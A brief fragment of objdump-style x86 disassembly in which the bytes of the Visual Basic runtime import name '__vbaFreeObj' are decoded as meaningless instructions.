  405b8e:	00 00                	add    %al,(%eax)
  405b90:	5f                   	pop    %edi
  405b91:	5f                   	pop    %edi
  405b92:	76 62                	jbe    0x405bf6
  405b94:	61                   	popa
  405b95:	46                   	inc    %esi
  405b96:	72 65                	jb     0x405bfd
  405b98:	65 4f                	gs dec %edi
  405b9a:	62 6a 00             	bound  %ebp,0x0(%edx)
	...
